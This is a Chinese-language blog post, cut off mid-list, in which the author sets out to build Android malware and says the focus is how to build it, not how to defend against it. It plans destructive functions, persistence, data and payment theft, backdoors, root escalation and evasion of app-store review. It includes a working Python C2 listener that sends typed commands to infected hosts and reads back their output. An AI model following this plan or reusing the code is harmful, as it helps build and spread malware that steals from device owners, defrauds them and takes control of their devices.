    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>目的是做一个恶意软件，实现基本恶意功能，当前版本专注于实现基本功能，只有基本界面和功能。那么一个恶意软件应当具有什么功能呢，下面主要研究的是怎么做，而不是防御和绕过检测。它将是一个纯粹的恶意软件。以下信息pc和安卓都有，只是将基于Android端开发。。。</p><p>安卓平台的特殊性</p><ul><li><p><strong>基于 Linux 内核：</strong> Android 系统基于 Linux 内核，这意味着一些 Linux 系统上的 Rootkit 技术也可以应用于 Android。</p></li><li><p><strong>分层架构：</strong> Android 系统采用分层架构，包括内核层、硬件抽象层 (HAL)、原生层、系统层和应用层。这使得恶意软件可以攻击不同的层级。</p></li><li><p><strong>权限管理：</strong> Android 有严格的权限管理机制，应用程序必须请求权限才能访问受保护的资源。</p></li><li><p><strong>启动过程：</strong> Android 的启动过程包括 Bootloader、Kernel、Init 进程、Zygote 进程和 System Server 等关键步骤。</p></li><li><p><strong>安全机制：</strong> Android 有多种安全机制，例如，SELinux、安全启动、应用签名、代码扫描等。</p></li></ul><h2 id="恶意功能"><a href="#恶意功能" class="headerlink" title="恶意功能"></a>恶意功能</h2><h3 id="破坏性"><a href="#破坏性" class="headerlink" title="破坏性"></a>破坏性</h3><ul><li><p>数据损坏和篡改：</p><ul><li>文件覆盖、数据加密，恶意修改数据</li></ul></li><li><p>无法正常使用业务：</p><ul><li>ddos</li><li>无限弹窗</li><li>锁屏功能</li></ul></li><li><p>系统崩溃：</p><ul><li>占用CPU、内存资源、制造错误等。破坏Android的Binder机制、破坏Android的SELinux策略</li></ul></li><li><p>无法初始化系统：</p><ul><li>利用漏洞修改系统文件，防止用户进入恢复模式，强制重启设备，以及加密手机存储等方式。</li></ul></li><li><p>破坏恢复机制：</p><ul><li>删除备份、修改恢复设置</li></ul></li></ul><h3 id="恶意操作（非预期，不被希望的操作）"><a href="#恶意操作（非预期，不被希望的操作）" class="headerlink" title="恶意操作（非预期，不被希望的操作）"></a>恶意操作（非预期，不被希望的操作）</h3><ul><li><p>恶意下载：</p><ul><li>路过式下载，静默下载，强制安装，捆绑安装,绕过安全防护进行下载，Android环境下绕过应用商店的检测</li></ul></li><li><p>在后台自启动运行：</p><ul><li>恶意软件通常在用户不知情的情况下运行，消耗设备资源，降低设备性能。利用设备进行挖矿操作。 在Android系统中，可以使用 AlarmManager 实现定时任务，或者使用 WorkManager 来执行一些后台任务。</li></ul></li><li><p>阻止用户卸载： </p><ul><li>恶意软件会采取一些手段，阻止用户卸载该应用程序。从权限层面进行限制，例如阻止卸载界面显示，设置需要密码才能卸载。使用 DeviceAdmin 权限、修改系统设置、伪造卸载界面等</li></ul></li><li><p>窃取信息：</p><ul><li>利用漏洞非法读取信息，例如浏览器历史记录， Cookie， 账号密码，文件信息。利用社会工程学骗取信息</li></ul></li><li><p>发送短信或拨打电话： </p><ul><li>恶意软件可能在后台发送短信（可能包含诈骗链接）或拨打收费电话，给用户造成经济损失。</li></ul></li><li><p>获取Root权限： </p><ul><li>如果恶意软件获取了Root权限，它可以进行更深入的系统控制，例如安装系统级别的恶意代码。</li></ul></li><li><p>修改系统设置： </p><ul><li>修改系统设置，禁用安全功能，或更改网络设置，使其更容易进行其他恶意活动。修改注册表、操作底层文件系统。禁用安全更新、修改DNS设置、更改网络代理</li></ul></li></ul><h3 id="代码操作"><a href="#代码操作" class="headerlink" title="代码操作"></a>代码操作</h3><ul><li><p>进程注入<br>进程注入是指将恶意代码注入 <code>explorer.exe</code> 或 <code>svchost.exe</code> 等合法进程。这有助于通过在受信任的进程中执行来隐藏恶意软件的恶意意图。 可以使用 CreateRemoteThread、WriteProcessMemory 等 API 来实现代码注入。</p></li><li><p>进程空心<br>进程挖空是恶意软件在暂停合法进程、用恶意代码替换其代码并使用恶意代码恢复执行时使用的一种技术。这使得恶意软件看起来像是一个合法进程。可以使用 CreateProcess 和 NtUnmapViewOfSection 等 API 来实现进程空心</p></li></ul><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>后门可以分为本地后门和远程后门。本地后门可以利用系统漏洞，远程后门可以利用网络通信。<br>隐藏后门: 修改系统日志，隐藏监听端口，进行数据加密等等。<br>隐藏其存在并允许攻击者远程控制计算机的恶意软件。通常隐藏在操作系统底层，难以检测和清除。常用于维护对受感染系统的持久访问。<br>可以考虑使用Android的BroadcastReceiver，Service等组件来建立后门。</p><h3 id="命令与控制c2"><a href="#命令与控制c2" class="headerlink" title="命令与控制c2"></a>命令与控制c2</h3><p>许多恶意软件使用一种称为 c2（命令和控制）的东西。这是许多恶意软件的关键组件，尤其是在 APT（高级持续性威胁）、僵尸网络和其他形式的远程访问恶意软件中。此 c2 充当中心点，攻击者可以在此控制受感染机器上的恶意软件并与之通信。此基础设施允许攻击者远程向恶意软件发出命令并协调恶意软件将采取的活动。</p><p><strong>c2 通常做什么？</strong></p><ul><li><p>感染和回调</p><ul><li><p>一旦恶意软件感染了主机，它就会回调到 c2 以建立连接，并让攻击者知道系统已被入侵。这也称为<code>beaconing</code>。</p></li><li><p>通常，恶意软件会嵌入 IP 地址（恶意软件中也可能包含加密配置）、域或 URL，作为 c2 的联系点。在复杂的攻击中，恶意软件可能会使用 DGA（域生成算法）来创建随机域，从而使阻止或跟踪 c2 通信变得更加困难。</p></li></ul></li><li><p>持久性</p><ul><li>恶意软件将与 c2 保持持续连接，以发送数据、接收命令或发送定期“ping”以让 c2 知道它仍然活跃。它甚至可能是所有这些的混合。</li></ul></li><li><p>命令执行</p><ul><li><p>c2 还用于远程向恶意软件发送命令。这些命令可能包括：</p><ul><li><p>额外的有效载荷下载。</p></li><li><p>从系统中窃取数据。</p></li><li><p>接收并执行系统上的命令。</p></li><li><p>从受感染的系统向其他目标发起攻击。</p></li></ul></li></ul></li><li><p>数据泄露</p><ul><li><p>恶意软件 c2 服务器通常用于从受感染的系统中窃取数据。</p><ul><li><p>键盘记录器可能会使用 c2 来保存记录的键盘。</p></li><li><p>勒索软件可能会使用 c2 窃取数据，以便随后对被勒索的公司进行敲诈勒索。</p></li><li><p>窃取者使用 c2 窃取受损凭证和银行信息。</p></li></ul></li></ul></li><li><p>更新</p><ul><li>有时（这种情况很少见）恶意软件可能会使用 c2 更新自身，增加新功能。在一些复杂的攻击中，恶意软件是模块化的，这允许攻击者根据攻击阶段从 c2 动态加载“插件”或模块到恶意软件中。</li></ul></li><li><p>混淆&#x2F;逃避</p><ul><li>c2 通常会设置加密通信通道，以使窥探者更难确定 c2 通信正在做什么。</li></ul></li><li><p>重定向和代理</p><ul><li><p>Fast flux 是某些恶意软件用来频繁更改关联域名 IP 地址的技术。它可以解析大量 IP 地址，这些 IP 地址可充当实际 c2 基础设施的临时代理。</p></li><li><p>c2 服务器可能使用反向代理（也称为跳转箱），这可能是一个充当原始服务器中继的受感染系统。</p></li></ul></li></ul><p><strong>可能的 C2 协议</strong></p><ul><li><p>HTTP（s）</p><ul><li>通常用于隐藏与正常网络流量相关的流量。恶意软件将向 c2 发送 GET&#x2F;POST 请求。</li></ul></li><li><p>DNS 隧道</p><ul><li>一些恶意软件会在 DNS 查询中编码命令或数据。由于 DNS 流量通常不受密切监控，因此这种情况可能不会被注意到。</li></ul></li><li><p>自定义协议</p><ul><li><p>一些更复杂的恶意软件家族会创建专有协议来隐藏其 c2 连接。</p><ul><li>值得注意的是，这很难实现，如果您不知道自己在做什么，就不应该尝试。</li></ul></li></ul></li><li><p>P2P（点对点）</p><ul><li>僵尸网络使用 P2P 通信。每个受感染的系统都可以在需要时充当 C2，这使得摧毁 C2 基础设施变得更加困难。</li></ul></li><li><p><strong>C2 架构：</strong> C2 可以使用多种架构，例如：集中式架构、分布式架构、点对点架构等。</p></li><li><p><strong>C2 隐藏：</strong> C2 通常会使用多种技术来隐藏其踪迹，例如，域名生成算法（DGA）、Fast flux、加密通信等。</p></li><li><p><strong>C2 检测：</strong> 安全人员会使用多种技术来检测 C2 通信，例如，网络流量分析、域名信誉分析、行为分析等。</p></li><li><p><strong>C2 反制：</strong> 安全人员会采取多种手段来反制 C2，例如，阻断 C2 通信、追踪 C2 服务器、清除受感染设备等。</p></li></ul><p><strong>基本 c2 示例</strong></p><p>正如您所读到的，c2 被设计为恶意软件的“通信中心”，用于接收命令并决定下一步要做什么。下面是一个用 Python 编写的 c2 的基本示例：</p><p>复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def c2_server():</span><br><span class="line">    # listen on all interfaces</span><br><span class="line">    host = &#x27;0.0.0.0&#x27;</span><br><span class="line">    port = 4444</span><br><span class="line">    </span><br><span class="line">    # setup the socket</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    # limit total connections to 5</span><br><span class="line">    server_socket.listen(5) </span><br><span class="line"></span><br><span class="line">    print(f&quot;[+] Listening for incoming connections on &#123;host&#125;:&#123;port&#125;...&quot;)</span><br><span class="line"></span><br><span class="line">    client_socket, addr = server_socket.accept()</span><br><span class="line">    </span><br><span class="line">    # loop forever</span><br><span class="line">    while True:</span><br><span class="line">        command = input(&quot;Enter command to execute: &quot;)</span><br><span class="line">        # send the command </span><br><span class="line">        client_socket.send(command.encode())</span><br><span class="line">        if command.lower() == &#x27;exit&#x27;:</span><br><span class="line">            print(&quot;[-] Closing connection.&quot;)</span><br><span class="line">            client_socket.close()</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">        # return the results from the malware</span><br><span class="line">        result = client_socket.recv(1024).decode()</span><br><span class="line">        print(f&quot;Output:\n&#123;result&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    c2_server()</span><br></pre></td></tr></table></figure><h3 id="隐藏自身"><a href="#隐藏自身" class="headerlink" title="隐藏自身"></a>隐藏自身</h3><p>不出现桌面图标，伪装成系统进程，将代码注入到合法进程</p><h3 id="支付劫持"><a href="#支付劫持" class="headerlink" title="支付劫持"></a>支付劫持</h3><p>劫持用户的支付信息，进行盗刷</p><h3 id="激活方式"><a href="#激活方式" class="headerlink" title="激活方式"></a>激活方式</h3><p>特定用户触发：特定时间，特定地区，特定时间<br>事件：充电，接入wifi<br>水平仪、加速度传感器，陀螺仪</p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>要完成以上恶意操作，都需要“权限”，那就不能直接运行直接调用权限吗？不能，那样会无法启动</p><blockquote><p>[!NOTE] 权限<br>Android 权限系统提供的控件可提高用户对应用权限的认知，还可以限制应用对敏感数据的访问。在 Android 8.0 及更低版本中，权限配置包括将应用列入许可名单。特权应用如果未列入许可名单，即使位于 <code>priv-app</code> 路径中，也一样会被停用。在 Android 9 及更高版本上，如果设备尝试使用未正确列入许可名单的应用，则系统将无法启动。</p></blockquote><ol><li><p><strong>权限的定义：</strong> 在移动操作系统中，权限是应用程序访问受保护资源（例如：摄像头、麦克风、位置信息、联系人等）的许可。为了保护用户的隐私和安全，应用程序必须在获得用户明确同意的情况下才能使用这些资源。</p></li><li><p><strong>权限的分类（以Android为例）：</strong></p><ul><li><p><strong>普通权限（Normal Permissions）：</strong> 这些权限不会直接影响用户的隐私，例如：访问网络、保持屏幕唤醒等。应用程序可以直接声明这些权限，而无需用户授权。</p></li><li><p><strong>危险权限（Dangerous Permissions）：</strong> 这些权限可能会影响用户的隐私或安全，例如：访问联系人、读取短信、获取地理位置等。应用程序必须在运行时向用户请求这些权限。</p></li><li><p><strong>特殊权限（Special Permissions）：</strong> 这些权限涉及更敏感的操作，例如：修改系统设置、在其他应用之上显示内容等。应用程序必须在运行时请求这些权限，并且用户必须明确授权。</p></li></ul></li><li><p><strong>运行时权限请求（Runtime Permissions）：</strong> 为了提高用户体验和安全性，Android引入了运行时权限请求。应用程序必须在运行时向用户请求危险权限，用户可以根据自己的意愿授予或拒绝这些权限。</p></li></ol><p>所以获取“权限”需要特殊手段</p><h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>大致分为利用漏洞强制获取，和将权限设置放入恶意软件直接获取</p><p><strong>利用漏洞：</strong></p><ul><li><p><strong>操作系统漏洞：</strong> 操作系统中可能存在一些安全漏洞，恶意软件可以利用这些漏洞直接获取权限，而无需用户授权。Android的漏洞利用技术， 例如：利用栈溢出、堆溢出、Use-After-Free 等漏洞。</p></li><li><p><strong>应用漏洞：</strong> 某些应用程序可能存在安全漏洞，恶意软件可以利用这些漏洞来获取其他应用程序的权限。</p></li></ul><p><strong>权限绕过：</strong></p><ul><li><p><strong>覆盖攻击（Overlay Attack）：</strong> 恶意软件可以创建一个假的权限请求界面，覆盖在真实的权限请求界面之上。当用户点击“允许”时，实际上是将权限授予了恶意软件。</p></li><li><p><strong>点击劫持（Clickjacking）：</strong> 恶意软件可以将真实的权限请求界面隐藏在一个不可见的透明层之下，当用户点击透明层时，实际上是点击了真实的权限请求界面。</p></li><li><p><strong>权限滥用：</strong> 恶意软件可以利用用户已经授予的权限，来进行其他恶意操作。 例如，一个获取了网络权限的恶意程序，可以下载其他恶意软件，或者将用户的隐私数据上传到服务器。</p></li><li><p><strong>隐蔽授权：</strong> 利用用户在安装应用时的习惯，在用户不知情的情况下诱导用户点击，从而获得权限。</p></li><li><p><strong>辅助功能服务(Accessibility Service)</strong>:利用 Accessibility Service 来获取用户屏幕信息、模拟用户操作、进行权限提升。无障碍服务只能用于帮助残障用户使用 Android 设备和应用程序。它们在后台运行，并在触发 <code>[AccessibilityEvent](https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent)</code> s 时接收系统的回调。此类事件表示用户界面中的某些状态转换，例如，焦点已更改、单击了按钮等。此类服务可以选择请求查询活动窗口内容的功能。开发无障碍服务需要扩展此类并实现其抽象方法。</p></li></ul><p><strong>权限提升：</strong></p><ul><li><p><strong>Root权限：</strong> 恶意软件可以尝试获取设备的Root权限。一旦获取Root权限，它就可以绕过所有的权限检查，从而访问任何受保护的资源。</p></li><li><p><strong>系统权限：</strong> 一些特殊的系统应用程序可能拥有更高的权限，恶意软件可以尝试利用这些权限来获取其他应用程序的权限。</p></li><li><p>Android的Accessibility Service来进行权限提升。</p></li></ul><p><strong>社会工程学：</strong></p><ul><li><p><strong>欺骗：</strong> 恶意软件可以伪装成一个无害的应用程序，诱骗用户授予其不必要的权限。</p></li><li><p><strong>诱导：</strong> 恶意软件可以通过各种方式，例如：提供免费服务、奖励，来诱导用户授予权限。</p></li><li><p><strong>模仿：</strong> 恶意软件可以伪装成系统界面，让用户误以为自己在操作系统界面，从而点击授予权限。</p></li></ul><p><strong>其他手段：</strong></p><ul><li><p><strong>预装恶意软件：</strong> 恶意软件可以被预装在设备中，这种情况下，用户可能根本无法察觉。</p></li><li><p><strong>供应链攻击：</strong> 恶意软件可以通过供应链的方式传播，例如：攻击软件开发商或应用商店。恶意软件伪装成正常软件在应用商店里，吸引别人下载，它既可以直接获取所要的信息（比如步数app获取步数信息），也可以间接的获取权限（比如将确定按钮放在透明层之下）</p></li></ul><h3 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h3><p>只有普通权限是不够的：</p><ul><li><p><strong>权限限制：</strong> 普通权限只能访问有限的系统资源和API，无法进行深层次的恶意操作。</p></li><li><p><strong>安全沙箱：</strong> 普通应用程序运行在安全沙箱中，无法访问其他应用程序或系统资源，这限制了恶意软件的攻击能力。</p></li><li><p><strong>用户授权：</strong> 普通应用程序需要用户明确授权才能访问敏感权限，这使得恶意软件难以在用户不知情的情况下获取敏感信息。</p></li><li><p><strong>无法持久化：</strong> 普通应用程序无法在系统启动时自动启动，也无法在用户卸载后仍然运行。</p></li><li><p><strong>无法进行底层操作：</strong> 普通应用程序无法进行底层的系统操作，例如修改内核、驱动、固件等。</p></li><li><p><strong>无法阻止卸载：</strong> 普通应用程序难以阻止用户卸载。</p></li></ul><p>所以通常需要获得更高的权限，root权限</p><ol><li><p><strong>利用漏洞：</strong></p><ul><li><p><strong>内核漏洞：</strong> Android内核（基于Linux）中存在一些安全漏洞，恶意软件可以利用这些漏洞来直接获取root权限。 例如：利用脏牛漏洞，提权到root权限。</p></li><li><p><strong>驱动漏洞：</strong> 设备驱动程序中也可能存在漏洞，恶意软件可以利用这些漏洞来获取root权限。</p></li><li><p><strong>系统应用漏洞：</strong> 一些系统应用程序，例如：系统服务， 可能会存在漏洞，恶意软件可以利用这些漏洞来获取root权限。</p></li><li><p><strong>Bootloader 漏洞：</strong> 恶意软件可能会利用Bootloader的漏洞，来获取root权限。</p></li><li><p><strong>Recovery模式漏洞：</strong> 恶意软件可以利用Recovery模式的漏洞， 来获取root权限。</p></li><li><p><strong>OTA更新漏洞：</strong> 恶意软件可以利用OTA更新的漏洞， 来获取root权限。</p></li></ul></li><li><p><strong>利用Root工具：</strong></p><ul><li><p><strong>Root工具：</strong> 一些Root工具（例如：Magisk、Kingroot、SuperSU）可以帮助用户获取root权限。 恶意软件可以利用这些Root工具，或者伪装成这些Root工具，来诱骗用户授予其root权限。</p></li><li><p><strong>预装Root工具：</strong> 恶意软件开发者可能会将恶意软件预装在Root工具中，当用户安装Root工具时，恶意软件也会被安装。</p></li><li><p><strong>劫持Root工具：</strong> 恶意软件可能会劫持用户安装的Root工具，从而获取Root权限。</p></li></ul></li></ol><h3 id="权限列表"><a href="#权限列表" class="headerlink" title="权限列表"></a>权限列表</h3><ul><li><p><strong>读取和修改任何文件：</strong> 恶意软件可以读取和修改系统中的任何文件，例如：修改配置文件、删除系统文件、注入恶意代码。</p></li><li><p><strong>安装系统级恶意软件：</strong> 恶意软件可以安装系统级的恶意软件，例如：后门、Rootkit，这些恶意软件难以被用户发现和清除。</p></li><li><p><strong>禁用安全防护：</strong> 恶意软件可以禁用系统自带的安全防护功能，例如：SELinux、安全启动、应用验证等，从而提升自身的攻击能力。</p></li><li><p><strong>隐藏自身：</strong> 恶意软件可以隐藏自身的进程，服务， 使得其难以被检测到。</p></li><li><p><strong>劫持系统服务：</strong> 恶意软件可以劫持系统服务，进行各种恶意操作，例如：拦截短信、窃取支付信息等。</p></li><li><p><strong>修改系统设置：</strong> 恶意软件可以修改系统的设置， 例如 修改DNS设置， 禁用安全更新等。</p></li><li><p><strong>劫持用户输入：</strong> 恶意软件可以劫持用户的输入，记录用户的键盘输入、触摸输入等，从而窃取敏感信息。</p></li><li><p><strong>远程控制：</strong> 获得root权限后，可以建立远程控制通道， 完全控制设备。</p></li><li><p><strong>提升持久化能力：</strong> 获得root权限后，可以修改系统启动文件，使得恶意软件在系统重启后仍然可以运行。</p></li><li><p><strong>防止卸载：</strong> 获得root权限后，可以阻止用户卸载恶意软件，例如删除卸载界面，修改系统文件等。</p></li><li><p><strong>窃取敏感数据：</strong> 恶意软件可以窃取用户的敏感数据，例如：联系人、短信、通话记录、位置信息、照片、视频、音频等。</p></li><li><p><strong>发起高级攻击：</strong> 可以利用root权限，进行各种高级攻击， 例如 DDoS攻击， 僵尸网络等。<br>如下：</p></li><li><p>READ_CONTACTS (读取联系人)</p></li><li><p>READ_SMS &#x2F; RECEIVE_SMS (读取短信&#x2F;接收短信)</p></li><li><p>READ_CALL_LOG (读取通话记录)</p></li><li><p>READ_EXTERNAL_STORAGE (读取外部存储，如照片、视频、音频)</p></li><li><p>ACCESS_FINE_LOCATION &#x2F; ACCESS_COARSE_LOCATION (读取地理位置)</p></li><li><p>READ_CLIPBOARD (读取剪贴板)</p></li><li><p>GET_TASKS (获取应用列表，这个权限在新版本被限制)</p></li><li><p>INTERNET (访问网络，用于与远程服务器通信)</p></li><li><p>WAKE_LOCK (保持设备唤醒，用于后台运行)</p></li><li><p>INSTALL_PACKAGES (安装其他应用)</p></li><li><p>SEND_SMS (发送短信)</p></li><li><p>CALL_PHONE (拨打电话)</p></li><li><p>CHANGE_WIFI_STATE (更改 Wi-Fi 状态)</p></li><li><p>WRITE_SETTINGS (修改系统设置)</p></li><li><p>PACKAGE_USAGE_STATS （访问应用使用统计，需要用户授权）</p></li><li><p>ACCESS_NETWORK_STATE (获取网络状态)</p></li><li><p>WAKE_LOCK (保持设备唤醒，用于长时间执行任务)</p></li><li><p>SYSTEM_ALERT_WINDOW (显示浮动窗口，用于显示广告)</p></li><li><p>SYSTEM_ALERT_WINDOW (锁定屏幕)</p></li></ul><h2 id="传播恶意软件本体"><a href="#传播恶意软件本体" class="headerlink" title="传播恶意软件本体"></a>传播恶意软件本体</h2><h3 id="电子邮件-手机短信"><a href="#电子邮件-手机短信" class="headerlink" title="电子邮件&#x2F;手机短信"></a>电子邮件&#x2F;手机短信</h3><p>钓鱼邮件，伪装发件人。欺骗收件人使其点击邮件链接</p><h3 id="EK"><a href="#EK" class="headerlink" title="EK"></a>EK</h3><p><a class="link"   href="https://www.paloaltonetworks.com/cyberpedia/what-is-an-exploit-kit" >exploit kit<i class="fas fa-external-link-alt"></i></a><br>路过式下载如此盛行是因为用于感染网站的攻击工具包很容易在黑市上买到，这种攻击包非常好用，并且是自动化的，让攻击者可以在尽可能多的服务器上散播恶意软件。<br>EK是一种基于服务器的框架，它使用漏洞利用浏览器相关软件应用程序中的漏洞，在用户不知情的情况下感染客户端（Windows 台式机或笔记本电脑）<br>大多数 EK 的作者使用软件即服务 （SaaS） 作为其业务模型。此模型有时也称为平台即服务 （PaaS）、恶意软件即服务 （MaaS） 或 EK 即服务 （EKaaS）。</p><p><strong>示例EK:</strong></p><ul><li><p><strong>Angler</strong>:<a class="link"   href="https://www.malwarebytes.com/blog/threats/angler" >https://www.malwarebytes.com/blog/threats/angler<i class="fas fa-external-link-alt"></i></a> Angler 是网络犯罪分子用来分发恶意软件（从勒索软件和银行木马到广告欺诈）的领先漏洞利用工具包之一。与大多数其他漏洞利用工具包一样，它专注于浏览器及其插件中基于 Web 的漏洞。Angler 是当时为数不多的提供无文件感染的漏洞利用工具包之一，其中恶意软件从不接触磁盘，仅驻留在内存中以避免被发现。 Angler 自 2016 年 6 月以来一直处于不活跃状态。</p></li><li><p><strong>RIG EK</strong>:<a class="link"   href="https://resources.prodaft.com/rig-exploit-kit-report" >https://resources.prodaft.com/rig-exploit-kit-report<i class="fas fa-external-link-alt"></i></a> RIG EK 是一项以经济为动机的计划，自 2014 年以来一直很活跃。尽管它尚未在最近的活动中实质性地改变其漏洞利用，但威胁行为者分发的恶意软件的类型和版本不断变化。更新样本的频率从每周更新到每天不等。</p></li><li><p><strong>Trojan dropper</strong>:<a class="link"   href="https://www.malwarebytes.com/blog/threats/trojan-dropper" >https://www.malwarebytes.com/blog/threats/trojan-dropper<i class="fas fa-external-link-alt"></i></a> 下载程序和植入程序是适用于各种类型恶意软件（如特洛伊木马和 Rootkit）的帮助程序。通常，它们以脚本（VB、批处理）或小型应用程序的形式实现。</p></li></ul><h3 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h3><ul><li>路过式下载欺诈：<ul><li>这些广告会在用户仅仅是查看广告时，就自动将恶意软件下载到用户的设备上，而无需用户点击。这是利用用户浏览器或操作系统的漏洞。</li></ul></li><li>重定向广告：<ul><li>这些广告会将用户重定向到不需要或恶意的网页。常见的目的地包括窃取个人信息的网络钓鱼网站、技术支持诈骗网站或恶意软件下载页面。</li></ul></li><li>欺骗性广告：<ul><li>需要擅长利用用户心理，引导用户点击，适用于一些必须交互才能进行的攻击</li></ul></li><li>恶意广告：<ul><li>指的是包含恶意代码的广告。它涉及将恶意代码注入合法的广告网络，使攻击者能够传播恶意软件或将用户重定向到恶意网站。</li></ul></li><li>广告注入：<ul><li>基于浏览器扩展的：恶意的浏览器扩展程序可以在用户不知情的情况下，将广告注入到网页中。这些广告可能具有欺骗性，将用户重定向到网络钓鱼网站，或下载恶意软件。</li><li>基于路由器的：被攻破的路由器可以将广告注入到所有网络流量中，通常用户对此毫不知情。</li><li>基于应用程序的 ： 一些移动应用程序，特别是来自非官方来源的应用程序，可以将不需要的广告注入到其他应用程序或操作系统本身中。</li></ul></li></ul><h3 id="应用商店"><a href="#应用商店" class="headerlink" title="应用商店"></a>应用商店</h3><p>直接上传在应用商店<br>应用商店（例如：Google Play Store、Apple App Store）为了保护用户安全，会对上架的应用程序进行审核，以检测是否存在恶意行为。 然而，恶意软件开发者会使用各种技术手段，绕过这些检测，将恶意应用程序伪装成合法应用程序，上传到应用商店。</p><ol><li><p><strong>代码混淆（Code Obfuscation）：</strong></p><ul><li><p><strong>原理：</strong> 将应用程序的代码进行混淆，使得代码难以阅读和理解。 这包括重命名变量、函数、类名，以及插入无意义的指令等。</p></li><li><p><strong>作用：</strong> 增加恶意代码分析的难度，使得应用商店的自动检测工具难以识别恶意行为。</p></li><li><p><strong>常用工具:</strong> ProGuard，DexGuard 等。</p></li></ul></li><li><p><strong>动态加载（Dynamic Loading）：</strong></p><ul><li><p><strong>原理：</strong> 将恶意代码放在服务器上，应用程序在运行时从服务器下载并加载这些代码。</p></li><li><p><strong>作用：</strong> 避免将恶意代码直接包含在应用程序的安装包中，使得应用商店的静态分析工具难以检测到。</p></li><li><p><strong>实现：</strong> 使用 DexClassLoader，PathClassLoader 等机制进行动态加载。</p></li></ul></li><li><p><strong>延时加载（Delayed Loading）：</strong></p><ul><li><p><strong>原理：</strong> 恶意代码不会在应用程序启动时立即执行，而是在经过一段时间后，或满足特定条件时才执行。</p></li><li><p><strong>作用：</strong> 避免在应用商店审核期间触发恶意行为，使得应用商店的审核人员难以察觉。</p></li><li><p><strong>实现：</strong> 使用 AlarmManager、WorkManager 等机制进行定时或延时执行。</p></li></ul></li><li><p><strong>服务器控制（Server-Side Control）：</strong></p><ul><li><p><strong>原理：</strong> 恶意代码的行为受服务器的控制，服务器可以随时改变恶意代码的行为。</p></li><li><p><strong>作用：</strong> 在应用商店审核期间，服务器可以指令应用程序执行正常行为；而在用户安装后，服务器则可以指令应用程序执行恶意行为。</p></li><li><p><strong>实现：</strong> 使用C&amp;C服务器 (Command and Control Server)进行远程控制。</p></li></ul></li><li><p><strong>加壳（Packing）：</strong></p><ul><li><p><strong>原理：</strong> 使用加壳工具对应用程序的安装包进行加密或压缩，使得安装包难以分析。</p></li><li><p><strong>作用：</strong> 增加恶意代码分析的难度，使得应用商店的检测工具难以识别恶意行为。</p></li><li><p><strong>原理:</strong> 在原有的程序外层加一个保护壳。加壳后的程序在运行时，会先运行加壳程序，然后由加壳程序负责解密原始程序，并将控制权转交给原始程序</p></li></ul></li><li><p><strong>白名单（Whitelisting）：</strong></p><ul><li><p><strong>原理：</strong> 恶意代码只会针对特定的用户或设备执行，而对应用商店的审核人员则执行正常行为。</p></li><li><p><strong>作用：</strong> 使得应用商店的审核人员难以发现恶意行为。</p></li><li><p><strong>实现：</strong> 使用设备信息、地理位置信息、IP 地址等来进行白名单判断。</p></li></ul></li><li><p><strong>社会工程学（Social Engineering）：</strong></p><ul><li><p><strong>原理：</strong> 将恶意应用程序伪装成合法的应用程序，例如：游戏、工具、壁纸等，诱骗用户下载。</p></li><li><p><strong>作用：</strong> 使得用户放松警惕，主动下载恶意应用程序。</p></li><li><p><strong>实现：</strong> 使用精美的应用图标、诱人的应用名称、虚假的用户评论等。</p></li></ul></li><li><p><strong>利用合法功能：</strong></p><ul><li><p><strong>原理：</strong> 恶意应用程序使用应用程序的合法功能，来实现恶意目的。</p></li><li><p><strong>作用：</strong> 使得应用商店难以区分应用程序的合法行为和恶意行为。</p></li><li><p><strong>实现：</strong> 例如：使用 Accessibility Service 读取用户屏幕信息、使用DownloadManager 下载恶意代码、使用BroadcastReceiver监听系统事件等。</p></li></ul></li><li><p><strong>漏洞利用：</strong></p><ul><li><p><strong>原理：</strong> 恶意应用程序利用应用商店的审核系统的漏洞，绕过审核。</p></li><li><p><strong>作用：</strong> 使得恶意应用可以成功上架到应用商店。</p></li></ul></li><li><p><strong>购买应用：</strong></p><ul><li><p><strong>原理：</strong> 恶意软件开发者会收购一些合法应用，然后通过更新的形式，注入恶意代码。</p></li><li><p><strong>作用：</strong> 利用用户对已安装应用的信任，来获取权限，并执行恶意代码。</p></li></ul></li></ol><h3 id="设备传播"><a href="#设备传播" class="headerlink" title="设备传播"></a>设备传播</h3><p>usb，蓝牙，NFC，wifi，QR扫码<br><strong>1. USB 传播：</strong></p><ul><li><p><strong>传播路径：</strong></p><ol><li><p><strong>恶意软件植入：</strong> 恶意软件首先需要被植入到USB存储设备中，这可以通过多种方式实现：</p><ul><li><p><strong>人工感染：</strong> 攻击者手动将携带恶意软件的文件复制到USB设备中。</p></li><li><p><strong>自动感染：</strong> 攻击者利用受感染的计算机，当USB设备插入计算机时，恶意软件自动复制到USB设备中。</p></li><li><p><strong>供应链攻击：</strong> 攻击者控制USB设备的生产商，将恶意软件预装到USB设备中。</p></li></ul></li><li><p><strong>设备插入：</strong> 用户将受感染的USB设备插入计算机或移动设备中。</p></li><li><p><strong>自动执行：</strong> 